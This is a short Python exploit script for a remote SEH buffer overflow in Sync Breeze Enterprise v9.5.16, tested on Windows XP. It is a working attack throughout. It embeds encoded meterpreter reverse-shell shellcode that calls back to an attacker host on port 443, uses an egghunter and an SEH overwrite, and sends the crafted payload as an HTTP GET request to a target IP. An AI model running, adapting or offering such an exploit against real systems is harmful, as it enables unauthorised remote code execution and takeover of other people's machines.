# Exploit Title: Sync Breeze Enterprise v9.5.16 Structured Exception Handler Remote BOF
# Tested on: Windows XP Professional SP3

import socket

host = '192.168.219.161'
port = 80

# Bad Chars Identified \x00 \x09 \x0A \x0D \x20
# POP POP RETN 0x1001c97c

# windows/meterpreter/reverse_ord_tcp LHOST=192.168.219.132 LPORT=443 EXITFUNC=thread
shellcode =  ""
shellcode += "\xdb\xc3\xbb\x01\x03\xfc\x8c\xd9\x74\x24\xf4\x58"
shellcode += "\x29\xc9\xb1\x1f\x31\x58\x17\x83\xc0\x04\x03\x59"
shellcode += "\x10\x1e\x79\xe1\xf1\x5e\x30\x4e\x25\x8a\xec\x04"
shellcode += "\xfd\xc7\x51\xcd\x34\x96\x76\x3c\x81\xca\x85\x78"
shellcode += "\x1e\x6e\x4f\x67\x42\x37\xf3\xbd\x3a\x7b\x24\x1e"
shellcode += "\x33\x02\x63\xf3\xae\xc2\x40\x13\xdb\xb0\x9e\x05"
shellcode += "\xba\xee\x26\xbc\x7c\x0c\xed\x94\x62\x41\x40\x4b"
shellcode += "\xf7\x61\xff\x3b\x17\x52\x3e\xb1\x02\x12\xf5\x9b"
shellcode += "\x2a\x1e\xc4\x94\x42\xec\x42\x9c\x32\x69\x3b\x54"
shellcode += "\xcc\x02\x50\x79\x49\x39\xa9\x6d\x47\x19\xb0\x53"
shellcode += "\xe2\x2e\x81\xbd\x4c\x8e\xa7\xa5\x11\xdb\x2e\xc4"
shellcode += "\x52\x43\x11\xfb\x42\x3a\x59\xaf\x9a\xa2\x03\xb6"
shellcode += "\x32\x5d\xe1"

egghunter =  ""
egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74" 
egghunter += "\xef\xb8\x6e\x69\x6a\x6f\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" 

payload = 'njoffsec' * 310 + 'njpwned' + '\x90\x90\xeb\x05' + '\x7c\xc9\x01\x10' + '\x90\x90\x90\x90\x90' + egghunter + '\x90\x90' + 'nijonijo' + shellcode + '\x90\x90' + 'njpwn' + 'njoffsec' * 538

# HTTP Evil Request
evilrequest = "GET /" + payload + " HTTP/1.1" + "\r\n"
evilrequest += "Host: " + host + "\r\n"
evilrequest += "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0" + "\r\n"
evilrequest += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + "\r\n"
evilrequest += "Accept-Language: en-US,en;q=0.5" + "\r\n"
evilrequest += "Accept-Encoding: gzip, deflate" + "\r\n"
evilrequest += "DNT: 1" + "\r\n"
evilrequest += "Connection: close" + "\r\n"
evilrequest += "Upgrade-Insecure-Requests: 1" + "\r\n\r\n"

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect((host,port))
socket.send(evilrequest)
socket.close()
